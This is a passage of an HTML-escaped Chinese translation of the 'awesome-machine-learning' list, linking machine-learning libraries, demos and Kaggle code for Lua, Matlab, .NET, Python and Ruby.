&lt;li&gt;&lt;a href=&quot;http://labix.org/lunatic-python&quot;&gt;Lunatic Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.scilua.org/&quot;&gt;SciLua&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://bitbucket.org/lucashnegri/lna&quot;&gt;Lua – Numerical Algorithms&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zrake.webfactional.com/projects/lunum&quot;&gt;Lunum&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning#demos-and-scripts&quot; name=&quot;user-content-demos-and-scripts&quot;&gt;&lt;/a&gt;演示及脚本&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/e-lab/torch7-demos&quot;&gt;Core torch7 demos repository&lt;/a&gt;.核心torch7演示程序库
&lt;ul&gt;
&lt;li&gt;线性回归、逻辑回归&lt;/li&gt;
&lt;li&gt;人脸检测（训练和检测是独立的演示）&lt;/li&gt;
&lt;li&gt;基于mst的断词器&lt;/li&gt;
&lt;li&gt;train-a-digit-classifier&lt;/li&gt;
&lt;li&gt;train-autoencoder&lt;/li&gt;
&lt;li&gt;optical flow demo&lt;/li&gt;
&lt;li&gt;train-on-housenumbers&lt;/li&gt;
&lt;li&gt;train-on-cifar&lt;/li&gt;
&lt;li&gt;tracking with deep nets&lt;/li&gt;
&lt;li&gt;kinect demo&lt;/li&gt;
&lt;li&gt;滤波可视化&lt;/li&gt;
&lt;li&gt;saliency-networks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/soumith/galaxyzoo&quot;&gt;Training a Convnet for the Galaxy-Zoo Kaggle challenge(CUDA demo)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/mbhenaff/MusicTagging&quot;&gt;Music Tagging&lt;/a&gt;—torch7下的音乐标签脚本&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/rosejn/torch-datasets&quot;&gt;torch-datasets&lt;/a&gt; 读取几个流行的数据集的脚本，包括：
&lt;ul&gt;
&lt;li&gt;BSR 500&lt;/li&gt;
&lt;li&gt;CIFAR-10&lt;/li&gt;
&lt;li&gt;COIL&lt;/li&gt;
&lt;li&gt;Street View House Numbers&lt;/li&gt;
&lt;li&gt;MNIST&lt;/li&gt;
&lt;li&gt;NORB&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/fidlej/aledataset&quot;&gt;Atari2600&lt;/a&gt; —在Arcade Learning Environment模拟器中用静态帧生成数据集的脚本。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Matlab&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#computer-vision&quot; name=&quot;user-content-computer-vision&quot;&gt;&lt;/a&gt;计算机视觉&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.ifp.illinois.edu/~minhdo/software/contourlet_toolbox.tar&quot;&gt;Contourlets&lt;/a&gt; —实现轮廓波变换及其使用函数的MATLAB源代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.shearlab.org/index_software.html&quot;&gt;Shearlets&lt;/a&gt;—剪切波变换的MATLAB源码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.curvelet.org/software.html&quot;&gt;Curvelets&lt;/a&gt;—Curvelet变换的MATLAB源码（Curvelet变换是对小波变换向更高维的推广，用来在不同尺度角度表示图像。）&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.cmap.polytechnique.fr/~peyre/download/&quot;&gt;Bandlets&lt;/a&gt;—Bandlets变换的MATLAB源码&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-4&quot; name=&quot;user-content-natural-language-processing-4&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://amplab.cs.berkeley.edu/2012/05/05/an-nlp-library-for-matlab/&quot;&gt;NLP&lt;/a&gt; —一个Matlab的NLP库&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-6&quot; name=&quot;user-content-general-purpose-machine-learning-6&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.cs.toronto.edu/~hinton/MatlabForSciencePaper.html&quot;&gt;Training a deep autoencoder or a classifier on MNIST digits&lt;/a&gt;—在MNIST字符数据集上训练一个深度的autoencoder或分类器[深度学习]。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://homepage.tudelft.nl/19j49/t-SNE.html&quot;&gt;t-Distributed Stochastic Neighbor Embedding&lt;/a&gt; —获奖的降维技术，特别适合于高维数据集的可视化&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://people.kyb.tuebingen.mpg.de/spider/&quot;&gt;Spider&lt;/a&gt;—Matlab机器学习的完整面向对象环境。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.csie.ntu.edu.tw/~cjlin/libsvm/#matlab&quot;&gt;LibSVM&lt;/a&gt; —支持向量机程序库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.csie.ntu.edu.tw/~cjlin/liblinear/#download&quot;&gt;LibLinear&lt;/a&gt; —大型线性分类程序库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/josephmisiti/machine-learning-module&quot;&gt;Machine Learning Module&lt;/a&gt; —M. A .Girolami教授的机器学习课程，包括PDF，讲义及代码。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://caffe.berkeleyvision.org/&quot;&gt;Caffe&lt;/a&gt;—考虑了代码清洁、可读性及速度的深度学习框架&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/newfolder/PRT&quot;&gt;Pattern Recognition Toolbox&lt;/a&gt; —Matlab中的模式识别工具包，完全面向对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-weight: bold;&quot;&gt;数据分析/数据可视化&lt;/span&gt;&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-4&quot; name=&quot;user-content-data-analysis--data-visualization-4&quot;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://www.cs.purdue.edu/homes/dgleich/packages/matlab_bgl/&quot;&gt;matlab_gbl&lt;/a&gt;—处理图像的Matlab包&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.mathworks.com/matlabcentral/fileexchange/24134-gaimc---graph-algorithms-in-matlab-code&quot;&gt;gamic&lt;/a&gt;—图像算法纯Matlab高效实现，对MatlabBGL的mex函数是个补充。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#python&quot; name=&quot;user-content-python&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h2&gt;.NET&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning#computer-vision-3&quot; name=&quot;user-content-computer-vision-3&quot;&gt;&lt;/a&gt;计算机视觉&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://code.google.com/p/opencvdotnet/&quot;&gt;OpenCVDotNet&lt;/a&gt; —包装器，使.NET程序能使用OpenCV代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.emgu.com/wiki/index.php/Main_Page&quot;&gt;Emgu CV&lt;/a&gt;—跨平台的包装器，能在Windows, Linus, Mac OS X, iOS, 和Android上编译。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning#natural-language-processing-6&quot; name=&quot;user-content-natural-language-processing-6&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/sergey-tihon/Stanford.NLP.NET/&quot;&gt;Stanford.NLP for .NET&lt;/a&gt; —斯坦福大学NLP包在.NET上的完全移植，还可作为NuGet包进行预编译。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning#general-purpose-machine-learning-9&quot; name=&quot;user-content-general-purpose-machine-learning-9&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.nuget.org/packages/Accord.MachineLearning/&quot;&gt;Accord.MachineLearning&lt;/a&gt; —支持向量机、决策树、朴素贝叶斯模型、K-means、高斯混合模型和机器学习应用的通用算法，例如：随机抽样一致性算法、交叉验证、网格搜索。这个包是Accord.NET框架的一部分。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/fsprojects/Vulpes&quot;&gt;Vulpes&lt;/a&gt;—F#语言实现的Deep belief和深度学习包，它在Alea.cuBase下利用CUDA GPU来执行。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.nuget.org/packages/encog-dotnet-core/&quot;&gt;Encog&lt;/a&gt; —先进的神经网络和机器学习框架，包括用来创建多种网络的类，也支持神经网络需要的数据规则化及处理的类。它的训练采用多线程弹性传播。它也能使用GPU加快处理时间。提供了图形化界面来帮助建模和训练神经网络。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://bragisoft.com/&quot;&gt;Neural Network Designer&lt;/a&gt; —这是一个数据库管理系统和神经网络设计器。设计器用WPF开发，也是一个UI，你可以设计你的神经网络、查询网络、创建并配置聊天机器人，它能问问题，并从你的反馈中学习。这些机器人甚至可以从网络搜集信息用来输出，或是用来学习。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning#data-analysis--data-visualization-6&quot; name=&quot;user-content-data-analysis--data-visualization-6&quot;&gt;&lt;/a&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.nuget.org/packages/numl/&quot;&gt;numl&lt;/a&gt; —numl这个机器学习库，目标就是简化预测和聚类的标准建模技术。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.nuget.org/packages/MathNet.Numerics/&quot;&gt;Math.NET Numerics&lt;/a&gt;—Math.NET项目的数值计算基础，着眼提供科学、工程以及日常数值计算的方法和算法。支持 Windows, Linux 和 Mac上的 .Net 4.0, .Net 3.5 和 Mono ，Silverlight 5, WindowsPhone/SL 8, WindowsPhone 8.1 以及装有 PCL Portable Profiles 47 及 344的Windows 8， 装有 Xamarin的Android/iOS 。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://research.microsoft.com/en-us/projects/sho/&quot;&gt;Sho&lt;/a&gt; —Sho是数据分析和科学计算的交互式环境，可以让你将脚本（IronPython语言）和编译的代码（.NET）无缝连接，以快速灵活的建立原型。这个环境包括强大高效的库，如线性代数、数据可视化，可供任何.NET语言使用，还为快速开发提供了功能丰富的交互式shell。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Python&lt;/h2&gt;
&lt;h4&gt;计算机视觉&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://simplecv.org/&quot;&gt;SimpleCV&lt;/a&gt;—开源的计算机视觉框架，可以访问如OpenCV等高性能计算机视觉库。使用Python编写，可以在Mac、Windows以及Ubuntu上运行。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-5&quot; name=&quot;user-content-natural-language-processing-5&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.nltk.org/&quot;&gt;NLTK&lt;/a&gt; —一个领先的平台，用来编写处理人类语言数据的Python程序&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.clips.ua.ac.be/pattern&quot;&gt;Pattern&lt;/a&gt;—Python可用的web挖掘模块，包括自然语言处理、机器学习等工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://textblob.readthedocs.org/&quot;&gt;TextBlob&lt;/a&gt;—为普通自然语言处理任务提供一致的API，以NLTK和Pattern为基础，并和两者都能很好兼容。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/fxsjy/jieba#jieba-1&quot;&gt;jieba&lt;/a&gt;—中文断词工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/isnowfy/snownlp&quot;&gt;SnowNLP&lt;/a&gt; —中文文本处理库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/victorlin/loso&quot;&gt;loso&lt;/a&gt;—另一个中文断词库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/duanhongyi/genius&quot;&gt;genius&lt;/a&gt; —基于条件随机域的中文断词库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/pprett/nut&quot;&gt;nut&lt;/a&gt; —自然语言理解工具包。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-7&quot; name=&quot;user-content-general-purpose-machine-learning-7&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/CamDavidsonPilon/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers&quot;&gt;Bayesian Methods for Hackers&lt;/a&gt; —Python语言概率规划的电子书&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://spark.apache.org/docs/latest/mllib-guide.html&quot;&gt;MLlib in Apache Spark&lt;/a&gt;—Spark下的分布式机器学习库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://scikit-learn.org/&quot;&gt;scikit-learn&lt;/a&gt;—基于SciPy的机器学习模块&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://graphlab.com/products/create/docs/&quot;&gt;graphlab-create&lt;/a&gt; —包含多种机器学习模块的库（回归，聚类，推荐系统，图分析等），基于可以磁盘存储的DataFrame。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://bigml.com/&quot;&gt;BigML&lt;/a&gt;—连接外部服务器的库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clips/pattern&quot;&gt;pattern&lt;/a&gt;—Python的web挖掘模块&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/numenta/nupic&quot;&gt;NuPIC&lt;/a&gt;—Numenta公司的智能计算平台。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/lisa-lab/pylearn2&quot;&gt;Pylearn2&lt;/a&gt;—基于Theano的机器学习库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/hannes-brt/hebel&quot;&gt;hebel&lt;/a&gt; —Python编写的使用GPU加速的深度学习库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/piskvorky/gensim&quot;&gt;gensim&lt;/a&gt;—主题建模工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/pybrain/pybrain&quot;&gt;PyBrain&lt;/a&gt;—另一个机器学习库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/muricoca/crab&quot;&gt;Crab&lt;/a&gt; —可扩展的、快速推荐引擎。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/ocelma/python-recsys&quot;&gt;python-recsys&lt;/a&gt; —Python实现的推荐系统。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/AllenDowney/ThinkBayes&quot;&gt;thinking bayes&lt;/a&gt;—关于贝叶斯分析的书籍&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/echen/restricted-boltzmann-machines&quot;&gt;Restricted Boltzmann Machines&lt;/a&gt; —Python实现的受限波尔兹曼机。[深度学习]。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/pprett/bolt&quot;&gt;Bolt&lt;/a&gt; —在线学习工具箱。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/patvarilly/CoverTree&quot;&gt;CoverTree&lt;/a&gt; —cover tree的Python实现，scipy.spatial.kdtree便捷的替代。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/nilearn/nilearn&quot;&gt;nilearn&lt;/a&gt;—Python实现的神经影像学机器学习库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/shogun-toolbox/shogun&quot;&gt;Shogun&lt;/a&gt;—机器学习工具箱。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/perone/Pyevolve&quot;&gt;Pyevolve&lt;/a&gt; —遗传算法框架。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://caffe.berkeleyvision.org/&quot;&gt;Caffe&lt;/a&gt; —考虑了代码清洁、可读性及速度的深度学习框架&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/breze-no-salt/breze&quot;&gt;breze&lt;/a&gt;—深度及递归神经网络的程序库，基于Theano。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-5&quot; name=&quot;user-content-data-analysis--data-visualization-5&quot;&gt;&lt;/a&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.scipy.org/&quot;&gt;SciPy&lt;/a&gt; —基于Python的数学、科学、工程开源软件生态系统。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.numpy.org/&quot;&gt;NumPy&lt;/a&gt;—Python科学计算基础包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://numba.pydata.org/&quot;&gt;Numba&lt;/a&gt; —Python的低级虚拟机JIT编译器，Cython and NumPy的开发者编写，供科学计算使用&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://networkx.github.io/&quot;&gt;NetworkX&lt;/a&gt; —为复杂网络使用的高效软件。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://pandas.pydata.org/&quot;&gt;Pandas&lt;/a&gt;—这个库提供了高性能、易用的数据结构及数据分析工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/avelino/mining&quot;&gt;Open Mining&lt;/a&gt;—Python中的商业智能工具（Pandas web接口）。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/pymc-devs/pymc&quot;&gt;PyMC&lt;/a&gt; —MCMC采样工具包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/quantopian/zipline&quot;&gt;zipline&lt;/a&gt;—Python的算法交易库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://pydy.org/&quot;&gt;PyDy&lt;/a&gt;—全名Python Dynamics，协助基于NumPy, SciPy, IPython以及 matplotlib的动态建模工作流。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/sympy/sympy&quot;&gt;SymPy&lt;/a&gt; —符号数学Python库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/statsmodels/statsmodels&quot;&gt;statsmodels&lt;/a&gt;—Python的统计建模及计量经济学库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.astropy.org/&quot;&gt;astropy&lt;/a&gt; —Python天文学程序库，社区协作编写&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://matplotlib.org/&quot;&gt;matplotlib&lt;/a&gt; —Python的2D绘图库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/ContinuumIO/bokeh&quot;&gt;bokeh&lt;/a&gt;—Python的交互式Web绘图库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://plot.ly/python&quot;&gt;plotly&lt;/a&gt; —Python and matplotlib的协作web绘图库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/wrobstory/vincent&quot;&gt;vincent&lt;/a&gt;—将Python数据结构转换为Vega可视化语法。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/mikedewar/d3py&quot;&gt;d3py&lt;/a&gt;—Python的绘图库，基于D3.js。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/yhat/ggplot&quot;&gt;ggplot&lt;/a&gt; —和R语言里的ggplot2提供同样的API。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/kartograph/kartograph.py&quot;&gt;Kartograph.py&lt;/a&gt;—Python中渲染SVG图的库，效果漂亮。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://pygal.org/&quot;&gt;pygal&lt;/a&gt;—Python下的SVG图表生成器。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/twitter/pycascading&quot;&gt;pycascading&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;杂项脚本/iPython笔记/代码库&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#misc-scripts--ipython-notebooks--codebases&quot; name=&quot;user-content-misc-scripts--ipython-notebooks--codebases&quot;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rasbt/pattern_classification&quot;&gt;pattern_classification&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Wavelets/ThinkStats2&quot;&gt;thinking stats 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/hyperopt/hyperopt-sklearn&quot;&gt;hyperopt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/numenta/nupic&quot;&gt;numpic&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/ged-lab/2012-paper-diginorm&quot;&gt;2012-paper-diginorm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/ogrisel/notebooks&quot;&gt;ipython-notebooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/CamDavidsonPilon/decision-weights&quot;&gt;decision-weights&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/Wavelets/sarah-palin-lda&quot;&gt;Sarah Palin LDA&lt;/a&gt; —Sarah Palin关于主题建模的电邮。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/Wavelets/diffusion-segmentation&quot;&gt;Diffusion Segmentation&lt;/a&gt; —基于扩散方法的图像分割算法集合。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/Wavelets/scipy-tutorials&quot;&gt;Scipy Tutorials&lt;/a&gt; —SciPy教程，已过时，请查看scipy-lecture-notes&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/marcelcaraciolo/crab&quot;&gt;Crab&lt;/a&gt;—Python的推荐引擎库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/maxsklar/BayesPy&quot;&gt;BayesPy&lt;/a&gt;—Python中的贝叶斯推断工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/GaelVaroquaux/scikit-learn-tutorial&quot;&gt;scikit-learn tutorials&lt;/a&gt;—scikit-learn学习笔记系列&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/madhusudancs/sentiment-analyzer&quot;&gt;sentiment-analyzer&lt;/a&gt; —推特情绪分析器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/fabianp/group_lasso&quot;&gt;group-lasso&lt;/a&gt;—坐标下降算法实验，应用于（稀疏）群套索模型。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/mne-tools/mne-python-notebooks&quot;&gt;mne-python-notebooks&lt;/a&gt;—使用 mne-python进行EEG/MEG数据处理的IPython笔记&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/jvns/pandas-cookbook&quot;&gt;pandas cookbook&lt;/a&gt;—使用Python pandas库的方法书。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/BRML/climin&quot;&gt;climin&lt;/a&gt;—机器学习的优化程序库，用Python实现了梯度下降、LBFGS、rmsprop、adadelta 等算法。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#kaggle-competition-source-code&quot; name=&quot;user-content-kaggle-competition-source-code&quot;&gt;&lt;/a&gt;Kaggle竞赛源代码&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/hammer/wikichallenge&quot;&gt;wiki challange&lt;/a&gt; —Kaggle上一个维基预测挑战赛 Dell Zhang解法的实现。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/amueller/kaggle_insults&quot;&gt;kaggle insults&lt;/a&gt;—Kaggle上”从社交媒体评论中检测辱骂“竞赛提交的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/MLWave/kaggle_acquire-valued-shoppers-challenge&quot;&gt;kaggle_acquire-valued-shoppers-challenge&lt;/a&gt;—Kaggle预测回头客挑战赛的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-cifar&quot;&gt;kaggle-cifar&lt;/a&gt; —Kaggle上CIFAR-10 竞赛的代码，使用cuda-convnet&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-blackbox&quot;&gt;kaggle-blackbox&lt;/a&gt; —Kaggle上blackbox赛代码，关于深度学习。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-accelerometer&quot;&gt;kaggle-accelerometer&lt;/a&gt; —Kaggle上加速度计数据识别用户竞赛的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-advertised-salaries&quot;&gt;kaggle-advertised-salaries&lt;/a&gt; —Kaggle上用广告预测工资竞赛的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-amazon&quot;&gt;kaggle amazon&lt;/a&gt; —Kaggle上给定员工角色预测其访问需求竞赛的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-bestbuy_big&quot;&gt;kaggle-bestbuy_big&lt;/a&gt;—Kaggle上根据bestbuy用户查询预测点击商品竞赛的代码（大数据版）&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-bestbuy_small&quot;&gt;kaggle-bestbuy_small&lt;/a&gt;—Kaggle上根据bestbuy用户查询预测点击商品竞赛的代码（小数据版）&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/kastnerkyle/kaggle-dogs-vs-cats&quot;&gt;Kaggle Dogs vs. Cats&lt;/a&gt; —Kaggle上从图片中识别猫和狗竞赛的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/benanne/kaggle-galaxies&quot;&gt;Kaggle Galaxy Challenge&lt;/a&gt; —Kaggle上遥远星系形态分类竞赛的优胜代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-gender&quot;&gt;Kaggle Gender&lt;/a&gt; —Kaggle竞赛：从笔迹区分性别&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-merck&quot;&gt;Kaggle Merck&lt;/a&gt;—Kaggle上预测药物分子活性竞赛的代码（默克制药赞助）&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/kaggle-stackoverflow&quot;&gt;Kaggle Stackoverflow&lt;/a&gt;—Kaggle上 预测Stack Overflow网站问题是否会被关闭竞赛的代码&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zygmuntz/wine-quality&quot;&gt;wine-quality&lt;/a&gt; —预测红酒质量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#ruby&quot; name=&quot;user-content-ruby&quot;&gt;&lt;/a&gt;Ruby&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-6&quot; name=&quot;user-content-natural-language-processing-6&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
